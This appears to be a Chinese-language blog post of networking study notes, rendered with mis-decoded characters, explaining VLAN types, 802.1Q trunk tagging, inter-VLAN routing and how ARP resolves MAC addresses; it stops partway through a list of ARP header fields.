<h2 id="VLANç±»å‹"><a href="#VLANç±»å‹" class="headerlink" title="VLANç±»å‹"></a>VLANç±»å‹</h2><h3 id="åŸºäºç«¯å£çš„VLAN-é™æ€VLAN"><a href="#åŸºäºç«¯å£çš„VLAN-é™æ€VLAN" class="headerlink" title="åŸºäºç«¯å£çš„VLAN-é™æ€VLAN"></a>åŸºäºç«¯å£çš„VLAN-é™æ€VLAN</h3><p>å°†äº¤æ¢æœºçš„ä¸åŒç«¯å£åˆ’åˆ†åˆ°ä¸åŒçš„VLANä¸­ï¼Œåªæœ‰ç›¸åŒçš„VLANé—´çš„è®¾å¤‡æ‰èƒ½ç›¸äº’é€šä¿¡ï¼Œä»è€Œå®ç°äº†å¯¹å¹¿æ’­åŸŸçš„éš”ç¦»ã€‚å¦‚ï¼ŒæŸä¸€ç«¯å£å±äºVLAN 10ï¼Œå…¶åªèƒ½ä¸åŒå±äºVLAN 10 çš„ç«¯å£çš„è®¾å¤‡è¿›è¡Œé€šä¿¡ã€‚</p>
<p>è¯¥æ–¹æ³•æ„å‘³ç€PCåªè¦æ›´æ¢äº†ç½‘çº¿ï¼Œå°±æœ‰å¯èƒ½è¿›å…¥äº†åˆ«çš„VLANï¼Œä»è€Œä¸èƒ½ä¸æŸäº›è®¾å¤‡è¿›è¡Œé€šä¿¡ã€‚</p>
<h3 id="åŸºäºMACåœ°å€çš„VLAN-åŠ¨æ€VLAN"><a href="#åŸºäºMACåœ°å€çš„VLAN-åŠ¨æ€VLAN" class="headerlink" title="åŸºäºMACåœ°å€çš„VLAN-åŠ¨æ€VLAN"></a>åŸºäºMACåœ°å€çš„VLAN-åŠ¨æ€VLAN</h3><p>äº¤æ¢æœºé€šè¿‡è¯†åˆ«MACåœ°å€æ¥è¯†åˆ«æŸä¸ªè®¾å¤‡å±äºå“ªä¸ªVLANï¼Œä»è€Œå®ç°äº†ï¼ŒåŠ¨æ€å¾—ç®¡ç†ã€‚ä½†ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œè¿™éœ€è¦è€—è´¹å¤§é‡çš„äººåŠ›ç‰©åŠ›åœ¨äº¤æ¢æœºä¸­é…ç½®VLANè¡¨</p>
<h3 id="åŸºäºåè®®çš„VLAN-åŠ¨æ€VLAN"><a href="#åŸºäºåè®®çš„VLAN-åŠ¨æ€VLAN" class="headerlink" title="åŸºäºåè®®çš„VLAN-åŠ¨æ€VLAN"></a>åŸºäºåè®®çš„VLAN-åŠ¨æ€VLAN</h3><p>æ ¹æ®PCè¿è¡Œçš„åè®®æ¥åˆ’åˆ†VLANï¼Œä½†è®¡ç®—æœºè¿è¡Œçš„åè®®æ˜¯æœ‰é™çš„ï¼Œä»è€Œé™åˆ¶äº†VLANçš„åˆ’åˆ†</p>
<h3 id="åŸºäºå­ç½‘çš„VLAN-åŠ¨æ€VLAN"><a href="#åŸºäºå­ç½‘çš„VLAN-åŠ¨æ€VLAN" class="headerlink" title="åŸºäºå­ç½‘çš„VLAN-åŠ¨æ€VLAN"></a>åŸºäºå­ç½‘çš„VLAN-åŠ¨æ€VLAN</h3><p>é€šè¿‡è¯†åˆ«å¸§ä¸­æºIPå±äºå“ªä¸ªç½‘æ®µæ¥åˆ’åˆ†VLANã€‚</p>
<h3 id="åŸºäºç”¨æˆ·çš„VLAN-åŠ¨æ€VLAN"><a href="#åŸºäºç”¨æˆ·çš„VLAN-åŠ¨æ€VLAN" class="headerlink" title="åŸºäºç”¨æˆ·çš„VLAN-åŠ¨æ€VLAN"></a>åŸºäºç”¨æˆ·çš„VLAN-åŠ¨æ€VLAN</h3><p>æ ¹æ®äº¤æ¢æœºå„ç«¯å£æ‰€è¿çš„è®¡ç®—æœºä¸Šå½“å‰ç™»å½•çš„ç”¨æˆ·ï¼Œæ¥å†³å®šè¯¥ç«¯å£å±äºå“ªä¸ªVLANã€‚è¿™é‡Œçš„ç”¨æˆ·è¯†åˆ«ä¿¡æ¯ï¼Œä¸€èˆ¬æ˜¯è®¡ç®—æœºæ“ä½œç³»ç»Ÿç™»å½•çš„ç”¨æˆ·ï¼Œæ¯”å¦‚å¯ä»¥æ˜¯WindowsåŸŸä¸­ä½¿ç”¨çš„ç”¨æˆ·åã€‚è¿™äº›ç”¨æˆ·åä¿¡æ¯ï¼Œå±äºOSIç¬¬å››å±‚ä»¥ä¸Šçš„ä¿¡æ¯ã€‚</p>
<h2 id="VLANæ ‡ç­¾æŠ€æœ¯"><a href="#VLANæ ‡ç­¾æŠ€æœ¯" class="headerlink" title="VLANæ ‡ç­¾æŠ€æœ¯"></a>VLANæ ‡ç­¾æŠ€æœ¯</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åœ¨ä¸€ä¸ªè®¾ç½®äº†VLANçš„äº¤æ¢æœºä¸­ï¼Œå½“è¯¥äº¤æ¢æœºçš„ä¸€ä¸ªç«¯å£æ”¶åˆ°ä¸€ä¸ªæ•°æ®å¸§çš„æ—¶å€™ï¼Œé€šè¿‡VLANè¡¨æŸ¥æ‰¾åˆ°è¯¥ç«¯å£æ‰€å±çš„VLANåï¼Œåœ¨è¯¥å¸§çš„æºMACåœ°å€ä¸TYPEåŸŸä¹‹é—´ä¼šæ’å…¥ä¸€ä¸ªVLANæ ‡ç­¾æ¥å”¯ä¸€æ ‡è¯†è¯¥å¸§å±äºæŸä¸ªVLANï¼Œç„¶åå†é€šè¿‡MACåœ°å€è¡¨æŸ¥æ‰¾è¯¥å¸§è¦å‘é€åˆ°çš„ç«¯å£å¹¶åˆ¤æ–­è¯¥ç«¯å£çš„VLAN ID ï¼Œè‹¥ç›¸åŒåˆ™å°†VLANæ ‡ç­¾å‰¥ç¦»é‡æ–°å°è£…è¯¥å¸§å¹¶è½¬å‘ï¼Œè‹¥ä¸ç›¸åŒåˆ™ä¸¢å¼ƒè¯¥å¸§ã€‚</p>
<h3 id="å¦‚ä½•åœ¨ä¸¤ä¸ªäº¤æ¢æœºé—´å®ç°VLAN"><a href="#å¦‚ä½•åœ¨ä¸¤ä¸ªäº¤æ¢æœºé—´å®ç°VLAN" class="headerlink" title="å¦‚ä½•åœ¨ä¸¤ä¸ªäº¤æ¢æœºé—´å®ç°VLAN"></a>å¦‚ä½•åœ¨ä¸¤ä¸ªäº¤æ¢æœºé—´å®ç°VLAN</h3><p>å½“éœ€è¦å°†ä¸¤ä¸ªå¤„äºä¸åŒäº¤æ¢æœºä¸Šçš„ç”¨æˆ·åˆ’åˆ†åˆ°åŒä¸€VLANä¸­æ—¶ï¼Œä¸€èˆ¬é‡‡ç”¨çš„ç­–ç•¥æ˜¯åœ¨ä¸¤ä¸ªäº¤æ¢é—´å»ºç«‹é“¾è·¯ï¼Œå°†å…¶å¯¹åº”çš„ç«¯å£è®¾ç½®ä¸ºåŒä¸€VLANå³å¯ï¼Œä½†è¿™ç§æ–¹å¼ï¼Œå½“VLANçš„æ•°ç›®é€æ¸å¢åŠ ä¹‹åå°±æ˜¾å¾—æ‰è¥Ÿè§è‚˜äº†ï¼Œé‡‡ç”¨è¿™ç§æ–¹å¼ä¸ä»…éœ€è¦å»ºç«‹å¤§é‡çš„ç‰©ç†è¿æ¥ï¼Œå…¶æ¯ä¸€æ¡é“¾è·¯çš„åˆ©ç”¨ç‡ä¹Ÿæ˜¯æåœ°çš„ï¼Œè¿™æ˜¾ç„¶ä¸æ˜¯ä¸€ç§å¥½çš„è§£å†³æ–¹æ¡ˆã€‚</p>
<p>è¿™æ—¶éœ€è¦ç”¨åˆ°TRUNK(ä¸­ç»§)æŠ€æœ¯ï¼Œäº¤æ¢æœºçš„æ¥å£å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç±»æ˜¯ä¸PCç›´è¿çš„ç§°ä¹‹ä¸ºACCESSï¼Œä¸€ç±»æ˜¯äº¤æ¢æœºä¹‹é—´äº’è¿çš„ç§°ä¹‹ä¸ºTRUNKï¼ŒTRUNKçš„ä¼˜ç‚¹æ˜¯å¯ä»¥å…è®¸é“¾è·¯ä¸Šé€šè¿‡ä¸åŒVLAN IDçš„æ•°æ®ã€‚</p>
<p>ä¾‹ï¼šå½“äº¤æ¢æœºåœ¨è½¬å‘å¸§çš„æ—¶å€™ï¼Œå‘ç°é™¤æ¥å—ç«¯å£å¤–çš„ç›´è¿ç«¯å£ä¸­å¹¶æ²¡æœ‰åŒ¹é…çš„VLANï¼Œæ­¤æ—¶äº¤æ¢æœºå°†æ•°æ®é€šè¿‡TRUNKè½¬å‘å‡ºå»ã€‚</p>
<h3 id="æ ‡ç­¾ç±»å‹ä¸æ ¼å¼"><a href="#æ ‡ç­¾ç±»å‹ä¸æ ¼å¼" class="headerlink" title="æ ‡ç­¾ç±»å‹ä¸æ ¼å¼"></a>æ ‡ç­¾ç±»å‹ä¸æ ¼å¼</h3><p>è¯¥éƒ¨åˆ†ç¬”è®°æ¥è‡ªï¼š</p>
<p><a href="https://support.huawei.com/enterprise/zh/doc/EDOC1100088136">IEEE 802.1Qå°è£…çš„VLANæ•°æ®å¸§æ ¼å¼</a></p>
<p><strong>Cisco ISLåè®®</strong></p>
<p>æ€ç§‘å¼€å‘çš„ä¸€ç§VLANæ ‡ç­¾åè®®æ ¼å¼ï¼Œç”±äºå…¶å ç”¨æ•°æ®é‡è¾ƒå¤§ç­‰å› ç´ ï¼Œç°ä»¥å¾ˆå°‘ä½¿ç”¨</p>
<p><strong>IEEE 802.1Qåè®®</strong></p>
<p>å½“ä»Šä½¿ç”¨æœ€å¤šçš„ä¸€ç§æ ‡ç­¾åè®®ç±»å‹ã€‚</p>
<p><img src="/archives/776f7656/download.png"></p>
<p><a href="VLAN%E6%A0%87%E7%AD%BE%E6%A0%BC%E5%BC%8F%20835161fbbe6c4960890ae8174d4e7306.csv">VLANæ ‡ç­¾æ ¼å¼</a></p>
<h2 id="VLANé€šä¿¡è¿‡ç¨‹"><a href="#VLANé€šä¿¡è¿‡ç¨‹" class="headerlink" title="VLANé€šä¿¡è¿‡ç¨‹"></a>VLANé€šä¿¡è¿‡ç¨‹</h2><h3 id="åŒä¸€VLANé—´é€šä¿¡è¿‡ç¨‹"><a href="#åŒä¸€VLANé—´é€šä¿¡è¿‡ç¨‹" class="headerlink" title="åŒä¸€VLANé—´é€šä¿¡è¿‡ç¨‹"></a>åŒä¸€VLANé—´é€šä¿¡è¿‡ç¨‹</h3><p>å½“ä¸€ä¸ªä»¥å¤ªç½‘å¸§ç»ç”±F0&#x2F;1ç«¯å£è¿›å…¥äº¤æ¢æœºåï¼Œäº¤æ¢æœºé€šè¿‡æŸ¥æ‰¾VLANè¡¨åŒ¹é…F0&#x2F;1ç«¯å£å¯¹åº”çš„VLAN ID ï¼Œå¹¶åœ¨è¯¥å¸§çš„æºMACåœ°å€ä¸TYPEåŸŸä¹‹é—´æ’å…¥4Bytesçš„IEEE 802.1Qæ ‡ç­¾å¹¶é‡æ–°è®¡ç®—FCSå€¼ï¼Œç„¶åå¯¹æ¯”è¯¥ä»¥å¤ªç½‘å¸§ä¸­çš„ç›®æ ‡MACåœ°å€åŒ¹é…MACåœ°å€è¡¨ï¼Œè‹¥åŒ¹é…ä¸æˆåŠŸï¼Œåˆ™é€šè¿‡å¹¿æ’­çš„æ–¹å¼å°†è¯¥ä»¥å¤ªç½‘å¸§å‘é™¤äº†å…¶æºç«¯å£å¤–çš„æ‰€æœ‰åŒä¸€VLANå†…çš„ç«¯å£è¿›è¡Œå¹¿æ’­ï¼Œè‹¥åŒ¹é…æˆåŠŸï¼Œåœ¨ä»VLANè¡¨ä¸­æŸ¥æ‰¾ç›®æ ‡MACåœ°å€æ‰€åœ¨çš„ç«¯å£æ˜¯å¦ä¸æºç«¯å£å¤„åœ¨åŒä¸€VLANä¸­ï¼Œè‹¥ä¸åŒ¹é…ï¼Œåˆ™ä¸¢å¼ƒè¯¥å¸§ï¼Œè‹¥æˆåŠŸåŒ¹é…ï¼Œåˆ™å‰¥ç¦»VLANæ ‡ç­¾å…µé‡æ–°è®¡ç®—FCSå€¼å¯¹è¯¥å¸§è¿›è¡Œå°è£…å‘é€ã€‚</p>
<h3 id="åŒä¸€VLANè·¨äº¤æ¢æœºé€šä¿¡è¿‡ç¨‹"><a href="#åŒä¸€VLANè·¨äº¤æ¢æœºé€šä¿¡è¿‡ç¨‹" class="headerlink" title="åŒä¸€VLANè·¨äº¤æ¢æœºé€šä¿¡è¿‡ç¨‹"></a>åŒä¸€VLANè·¨äº¤æ¢æœºé€šä¿¡è¿‡ç¨‹</h3><p>å°†ä¸¤ä¸ªäº¤æ¢æœºç›¸è¿äº¤çš„æ¥å£å‡é…ç½®æˆTRUNKæ¥å£ï¼Œä»è€Œä½¿è¯¥ç«¯å£å¯ä»¥è½¬å‘æ‰€æœ‰çš„VLANæ•°æ®ã€‚å½“ä¸¤å°è®¾å¤‡éœ€è¦è·¨äº¤æ¢æœºè¿›è¡Œé€šä¿¡æ—¶ã€‚å½“ä¸€ä¸ªä»¥å¤ªç½‘å¸§ç»ç”±F0&#x2F;1ç«¯å£è¿›å…¥äº¤æ¢æœºåï¼Œäº¤æ¢æœºé€šè¿‡æŸ¥æ‰¾VLANè¡¨åŒ¹é…F0&#x2F;1ç«¯å£å¯¹åº”çš„VLAN ID ï¼Œå¹¶åœ¨è¯¥å¸§çš„æºMACåœ°å€ä¸TYPEåŸŸä¹‹é—´æ’å…¥4Bytesçš„IEEE 802.1Qæ ‡ç­¾å¹¶é‡æ–°è®¡ç®—FCSå€¼ï¼Œç„¶åå¯¹æ¯”è¯¥ä»¥å¤ªç½‘å¸§ä¸­çš„ç›®æ ‡MACåœ°å€åŒ¹é…MACåœ°å€è¡¨ï¼Œè‹¥åŒ¹é…ä¸æˆåŠŸï¼Œåˆ™é€šè¿‡å¹¿æ’­çš„æ–¹å¼å°†è¯¥ä»¥å¤ªç½‘å¸§å‘é™¤äº†å…¶æºç«¯å£å¤–çš„æ‰€æœ‰åŒä¸€VLANå†…çš„ç«¯å£è¿›è¡Œå¹¿æ’­ï¼Œè‹¥åŒ¹é…æˆåŠŸï¼Œåœ¨ä»VLANè¡¨ä¸­æŸ¥æ‰¾ç›®æ ‡MACåœ°å€æ‰€åœ¨çš„ç«¯å£æ˜¯å¦ä¸æºç«¯å£å¤„åœ¨åŒä¸€VLANä¸­ï¼Œè‹¥ä¸åŒ¹é…ï¼Œåˆ™ä¸¢å¼ƒè¯¥å¸§ï¼Œè‹¥æˆåŠŸåŒ¹é…ï¼Œåˆ™å‰¥ç¦»VLANæ ‡ç­¾å…µé‡æ–°è®¡ç®—FCSå€¼å¯¹è¯¥å¸§è¿›è¡Œå°è£…å‘é€ã€‚æ­¤æ—¶ä»¥å¤ªç½‘å¸§ä»¥æœªè¢«æ ‡æ ‡è¯†çš„å¸§æ ¼å¼åœ¨TRUNKä¸Šä¼ è¾“ï¼Œå½“å…¶åˆ°è¾¾å¦ä¸€ä¸ªè·¯ç”±å™¨çš„TRNKæ¥å£æ—¶ï¼Œè¯¥è·¯ç”±å™¨æ‰§è¡Œä¸ä¸Šè¿°è¿‡ç¨‹ç›¸åŒçš„æ“ä½œï¼Œå°†è¯¥å¸§è½¬å‘åˆ°ç›®æ ‡MACå¯¹åº”çš„è®¾å¤‡ã€‚</p>
<h3 id="ä¸åŒVLANé—´é€šä¿¡è¿‡ç¨‹"><a href="#ä¸åŒVLANé—´é€šä¿¡è¿‡ç¨‹" class="headerlink" title="ä¸åŒVLANé—´é€šä¿¡è¿‡ç¨‹"></a>ä¸åŒVLANé—´é€šä¿¡è¿‡ç¨‹</h3><p>VLANåœ¨å®ç°äº†å¹¿æ’­åŸŸéš”ç¦»çš„åŒæ—¶ä¹Ÿéš”ç¦»äº†ä¸åŒVLANé—´é€šä¿¡çš„å¯èƒ½æ€§ã€‚è€Œè¦æƒ³åŒæ—¶å®ç°éš”ç¦»å¹¿æ’­åŸŸåˆèƒ½åœ¨VLANé—´è¿›è¡Œé€šä¿¡åˆ™éœ€è¦ç”¨åˆ°å¦ä¸€ç§è®¾å¤‡ï¼šè·¯ç”±å™¨è¯¥ä¾‹ä¸­ä½¿ç”¨çš„è·¯ç”±å™¨ï¼Œæˆ‘ä»¬å°†å…¶ç§°ä¹‹ä¸ºå•è‡‚è·¯ç”±ã€‚</p>
<p>å°†è·¯ç”±å™¨ä¸äº¤æ¢å™¨è¿æ¥çš„ç«¯å£è®¾ç½®ä¸ºTRUNKã€‚</p>
<p><img src="/archives/776f7656/v2-63baa76ac2837bc1f3ef6d9b438a0181_720w.png"></p>
<p>è®¡ç®—æœºAä»é€šä¿¡ç›®æ ‡çš„IPåœ°å€(192.168.2.1)å¾—å‡ºCä¸æœ¬æœºä¸å±äºåŒä¸€ä¸ªç½‘æ®µã€‚å› æ­¤ä¼šå‘è®¾å®šçš„é»˜è®¤ç½‘å…³(DefaultGatewayï¼ŒGW)è½¬å‘æ•°æ®å¸§ã€‚åœ¨å‘é€æ•°æ®å¸§ä¹‹å‰ï¼Œéœ€è¦å…ˆç”¨ARPè·å–è·¯ç”±å™¨çš„MACåœ°å€ã€‚</p>
<p>å¾—åˆ°è·¯ç”±å™¨çš„MACåœ°å€Råï¼Œæ¥ä¸‹æ¥å°±æ˜¯æŒ‰å›¾ä¸­æ‰€ç¤ºçš„æ­¥éª¤å‘é€å¾€Cå»çš„æ•°æ®å¸§ã€‚â‘ çš„æ•°æ®å¸§ä¸­ï¼Œç›®æ ‡MACåœ°å€æ˜¯è·¯ç”±å™¨çš„åœ°å€Rã€ä½†å†…å«çš„ç›®æ ‡IPåœ°å€ä»æ˜¯æœ€ç»ˆè¦é€šä¿¡çš„å¯¹è±¡Cçš„åœ°å€ã€‚è¿™ä¸€éƒ¨åˆ†çš„å†…å®¹ï¼Œæ¶‰åŠåˆ°å±€åŸŸç½‘å†…ç»è¿‡è·¯ç”±å™¨è½¬å‘æ—¶çš„é€šä¿¡æ­¥éª¤ï¼Œæœ‰æœºä¼šå†è¯¦ç»†è§£è¯´å§ã€‚</p>
<p>äº¤æ¢æœºåœ¨ç«¯å£1ä¸Šæ”¶åˆ°â‘ çš„æ•°æ®å¸§åï¼Œæ£€ç´¢MACåœ°å€åˆ—è¡¨ä¸­ä¸ç«¯å£1åŒå±ä¸€ä¸ªVLANçš„è¡¨é¡¹ã€‚ç”±äºæ±‡èšé“¾è·¯ä¼šè¢«çœ‹ä½œå±äºæ‰€æœ‰çš„VLANï¼Œå› æ­¤è¿™æ—¶äº¤æ¢æœºçš„ç«¯å£6ä¹Ÿå±äºè¢«å‚ç…§å¯¹è±¡ã€‚è¿™æ ·äº¤æ¢æœºå°±çŸ¥é“å¾€MACåœ°å€Rå‘é€æ•°æ®å¸§ï¼Œéœ€è¦ç»è¿‡ç«¯å£6è½¬å‘ã€‚</p>
<p>ä»ç«¯å£6å‘é€æ•°æ®å¸§æ—¶ï¼Œç”±äºå®ƒæ˜¯æ±‡èšé“¾æ¥ï¼Œå› æ­¤ä¼šè¢«é™„åŠ ä¸ŠVLANè¯†åˆ«ä¿¡æ¯ã€‚ç”±äºåŸå…ˆæ˜¯æ¥è‡ªçº¢è‰²VLANçš„æ•°æ®å¸§ï¼Œå› æ­¤å¦‚å›¾ä¸­â‘¡æ‰€ç¤ºï¼Œä¼šè¢«åŠ ä¸Šçº¢è‰²VLANçš„è¯†åˆ«ä¿¡æ¯åè¿›å…¥æ±‡èšé“¾è·¯ã€‚è·¯ç”±å™¨æ”¶åˆ°â‘¡çš„æ•°æ®å¸§åï¼Œç¡®è®¤å…¶VLANè¯†åˆ«ä¿¡æ¯ï¼Œç”±äºå®ƒæ˜¯å±äºçº¢è‰²VLANçš„æ•°æ®å¸§ï¼Œå› æ­¤äº¤ç”±è´Ÿè´£çº¢è‰²VLANçš„å­æ¥å£æ¥æ”¶ã€‚</p>
<p>æ¥ç€ï¼Œæ ¹æ®è·¯ç”±å™¨å†…éƒ¨çš„è·¯ç”±è¡¨ï¼Œåˆ¤æ–­è¯¥å‘å“ªé‡Œä¸­ç»§ã€‚</p>
<p>ç”±äºç›®æ ‡ç½‘ç»œ192.168.2.0&#x2F;24æ˜¯è“è‰²VLANï¼Œï¼Œä¸”è¯¥ç½‘ç»œé€šè¿‡å­æ¥å£ä¸è·¯ç”±å™¨ç›´è¿ï¼Œå› æ­¤åªè¦ä»è´Ÿè´£è“è‰²VLANçš„å­æ¥å£è½¬å‘å°±å¯ä»¥äº†ã€‚è¿™æ—¶ï¼Œæ•°æ®å¸§çš„ç›®æ ‡MACåœ°å€è¢«æ”¹å†™æˆè®¡ç®—æœºCçš„ç›®æ ‡åœ°å€;å¹¶ä¸”ç”±äºéœ€è¦ç»è¿‡æ±‡èšé“¾è·¯è½¬å‘ï¼Œå› æ­¤è¢«é™„åŠ äº†å±äºè“è‰²VLANçš„è¯†åˆ«ä¿¡æ¯ã€‚è¿™å°±æ˜¯å›¾ä¸­â‘¢çš„æ•°æ®å¸§ã€‚</p>
<p>äº¤æ¢æœºæ”¶åˆ°â‘¢çš„æ•°æ®å¸§åï¼Œæ ¹æ®VLANæ ‡è¯†ä¿¡æ¯ä»MACåœ°å€åˆ—è¡¨ä¸­æ£€ç´¢å±äºè“è‰²VLANçš„è¡¨é¡¹ã€‚ç”±äºé€šä¿¡ç›®æ ‡â€”â€”è®¡ç®—æœºCè¿æ¥åœ¨ç«¯å£3ä¸Šã€ä¸”ç«¯å£3ä¸ºæ™®é€šçš„è®¿é—®é“¾æ¥ï¼Œå› æ­¤äº¤æ¢æœºä¼šå°†æ•°æ®å¸§å»é™¤VLANè¯†åˆ«ä¿¡æ¯å(æ•°æ®å¸§â‘£)è½¬å‘ç»™ç«¯å£3ï¼Œæœ€ç»ˆè®¡ç®—æœºCæ‰èƒ½æˆåŠŸåœ°æ”¶åˆ°è¿™ä¸ªæ•°æ®å¸§ã€‚</p>
<p><a href="%E5%88%92%E5%88%86vlan%E5%91%BD%E4%BB%A4%20b42867526201431db722223d7e6dcf67.csv">åˆ’åˆ†vlanå‘½ä»¤</a></p>
<h2 id="ä¸‰å±‚äº¤æ¢æœº"><a href="#ä¸‰å±‚äº¤æ¢æœº" class="headerlink" title="ä¸‰å±‚äº¤æ¢æœº"></a>ä¸‰å±‚äº¤æ¢æœº</h2><h2 id="ARPåè®®"><a href="#ARPåè®®" class="headerlink" title="ARPåè®®"></a>ARPåè®®</h2><p>æœ¬éƒ¨åˆ†ç¬”è®°å‚è€ƒï¼š</p>
<p><a href="https://zhuanlan.zhihu.com/p/145782441">ä¸€æ–‡è¯»æ‡‚ARPåè®®ï¼Œä»IPè·å–å¯¹æ–¹MACå®æ“</a></p>
<p>ä¸¤å°PCè¦æˆåŠŸå®ç°ç›¸äº’é—´çš„é€šä¿¡ï¼Œå¿…é¡»è¦çŸ¥é“å¯¹æ–¹çš„IPåœ°å€ä»¥åŠMACåœ°å€ï¼ŒIPåœ°å€é€šè¿‡åŸŸåç³»ç»Ÿå¯ä»¥å¾ˆæ–¹ä¾¿å¾—è·å¾—ï¼Œé‚£ä¹ˆMACåœ°å€å‘¢ï¼Ÿæ­¤æ—¶å°±éœ€è¦ä¸€ä¸ªè·å–ç›®çš„ä¸»æœºMACåœ°å€çš„åè®®ã€‚ARPåè®®å³ä¸ºäº†å®Œæˆè¿™ä¸ªåŠŸèƒ½è€Œè®¾è®¡ã€‚</p>
<h3 id="ARPåè®®å·¥ä½œåŸç†"><a href="#ARPåè®®å·¥ä½œåŸç†" class="headerlink" title="ARPåè®®å·¥ä½œåŸç†"></a>ARPåè®®å·¥ä½œåŸç†</h3><p>åœ¨çŸ¥é“ç›®çš„ä¸»æœºIPåœ°å€çš„æƒ…å†µä¸‹ï¼Œè®¡ç®—æœºé¦–å…ˆåˆ¤æ–­è¯¥IPåœ°å€æ˜¯å¦ä¸è‡ªå·±å±äºåŒä¸€ä¸ªç½‘æ®µï¼Œå¦‚æœä¸å±äºåŒä¸€ä¸ªç½‘æ®µï¼Œåˆ™éœ€è¦å‘ç½‘å…³è½¬å‘ï¼Œè®¡ç®—æœºé€šè¿‡ç½‘å…³çš„IPåœ°å€åœ¨ARPç¼“å­˜è¡¨ä¸­æŸ¥æ‰¾æ˜¯å¦ä¿å­˜æœ‰ç½‘å…³çš„MACåœ°å€ï¼Œè‹¥æ— åˆ™å‘é€å¹¿æ’­ï¼Œè‹¥æœ‰åˆ™ç›´æ¥è¿›è¡Œå°è£…ã€‚è‹¥å±äºåŒä¸€ ç½‘æ®µï¼ŒIPæŠ¥æ–‡åˆ°è¾¾æ•°æ®é“¾è·¯å±‚è¿›è¡Œå°è£…ï¼Œæ­¤æ—¶éœ€è¦çŸ¥é“å¯¹æ–¹çš„MACåœ°å€ã€‚è®¡ç®—æœºä¼šé¦–å…ˆæŸ¥è¯¢è‡ªå·±çš„arpç¼“å­˜è¡¨ï¼Œå¦‚æœç¼“å­˜è¡¨ä¸­æœ‰ç›®æ ‡IPçš„MACåˆ™ä½¿ç”¨è¯¥MACåœ°å€è¿›è¡Œå°è£…ï¼Œå¦‚æœç¼“å­˜è¡¨ä¸­ä¸å­˜åœ¨è¯¥è¡¨é¡¹ï¼Œè¿™æ—¶ä¸»æœºä¼šå‘äº¤æ¢æœºå‘é€ARP request æŠ¥æ–‡ï¼Œè¯¥æŠ¥æ–‡åœ¨æ•°æ®é“¾è·¯å±‚å°è£…å¸§å¤´ä¸å¸§å°¾ï¼Œå› ä¸ºä¸çŸ¥é“ç›®æ ‡MACåœ°å€ï¼Œæ­¤æ—¶ç›®çš„MACåœ°å€è¢«è®¾ç½®ä¸ºFF-FF-FF-FF-FF-FFã€‚äº¤æ¢æœºæ”¶åˆ°è¯¥æŠ¥æ–‡æ—¶å‘ç°ç›®æ ‡MACåœ°å€æ˜¯å¹¿æ’­åœ°å€ï¼Œäºæ˜¯å°†è¯¥æŠ¥æ–‡å‘é™¤æ¥ç«¯å£å¤–çš„æ‰€æœ‰ç«¯å£è¿›è¡Œå¹¿æ’­ï¼Œå¹¶åŒæ—¶å­¦ä¹ æ¥ç«¯å£çš„MACåœ°å€æ”¾å…¥MACåœ°å€è¡¨ã€‚å‘é€ç«¯å£çš„ä¸»æœºæ¥å—åˆ°è¯¥å¹¿æ’­çš„æ—¶å€™ï¼Œæ•°æ®é“¾è·¯å±‚é€šè¿‡è§£æå¸§å¤´å‘ç°å…¶ä¸­TYPEç±»å‹ä¸ºARPï¼Œäºæ˜¯å°†å…¶SDUéƒ¨åˆ†é€ç»™ç½‘ç»œå±‚çš„ARPåè®®è§£æï¼Œç½‘ç»œå±‚è§£æARPæŠ¥å¤´æ—¶å‘ç°è¯¥æŠ¥æ–‡çš„ç›®çš„IPåœ°å€ä¸è‡ªå·±çš„ä¸ä¸€è‡´ï¼Œäºæ˜¯å°†è¯¥æŠ¥æ–‡ä¸¢å¼ƒï¼Œå¹¶å­¦ä¹ è¯¥æŠ¥æ–‡ä¸­çš„æºMACåœ°å€ä¸æºIPåœ°å€æ˜ å°„å¹¶æ›´æ–°è‡ªå·±çš„ARPç¼“å­˜è¡¨ã€‚æ¥å—ç«¯å£ä¸»æœºåœ¨å‘ç°è¯¥ARPå¤´éƒ¨çš„ç›®çš„IPåœ°å€ä¸è‡ªå·±ä¸€è‡´çš„è¯ï¼Œå°†ä»¥å•æ’­çš„å½¢å¼ç»™æºä¸»æœºå›åº”ä¸€ä¸ªARP replay æŠ¥æ–‡å°†æºmacåœ°å€ä¿®æ­£ä¸ºè‡ªå·±çš„macåœ°å€ï¼Œç›®çš„macåœ°å€ä¿®æ”¹ä¸ºå¯¹æ–¹çš„macåœ°å€ï¼ŒARPæŠ¥å¤´ä¸­ç›®çš„macåœ°å€ä¸æºmacåœ°å€ã€æ“ä½œç å‡è¿›è¡Œä¿®æ­£ï¼Œå¹¶å­¦ä¹ æºä¸»æœºçš„IPä¸MACåœ°å€æ”¾å…¥è‡ªå·±çš„ARPç¼“å­˜è¡¨ã€‚æºä¸»æœºæ”¶åˆ°è¯¥replayåŒ…åï¼Œå°†å¾—åˆ°çš„ç›®çš„ä¸»æœºçš„IPåœ°å€å’ŒMACåœ°å€æ·»åŠ åˆ°è‡ªå·±çš„ARPåˆ—è¡¨ä¸­ï¼Œå¹¶åˆ©ç”¨æ­¤ä¿¡æ¯å¼€å§‹æ•°æ®çš„ä¼ è¾“ã€‚å¦‚æœæºä¸»æœºä¸€ç›´æ²¡æœ‰æ”¶åˆ°ARPå“åº”æ•°æ®åŒ…ï¼Œè¡¨ç¤ºARPæŸ¥è¯¢å¤±è´¥ã€‚</p>
<h3 id="ARPæŠ¥å¤´åˆ†æ"><a href="#ARPæŠ¥å¤´åˆ†æ" class="headerlink" title="ARPæŠ¥å¤´åˆ†æ"></a>ARPæŠ¥å¤´åˆ†æ</h3><p><img src="/archives/776f7656/1111.jpg"></p>
<ul>
<li>Hardware Typeï¼š è¡¨ç¤ºç¡¬ä»¶åœ°å€ç±»å‹ï¼Œä¸€èˆ¬ä¸ºä»¥å¤ªç½‘ï¼›</li>
<li>Protocol Typeï¼š è¡¨ç¤ºä¸‰å±‚åè®®åœ°å€ç±»å‹ï¼Œä¸€èˆ¬ä¸ºIPï¼›</li>
<li>Hardware Lengthå’ŒProtocol Lengthï¼šä¸ºMACåœ°å€å’ŒIPåœ°å€çš„é•¿åº¦ï¼Œå•ä½æ˜¯å­—èŠ‚ï¼›</li>
<li>Operation Codeï¼š æŒ‡å®šäº†ARPæŠ¥æ–‡çš„ç±»å‹ï¼ŒåŒ…æ‹¬ARP requestå’ŒARP replyï¼›</li>
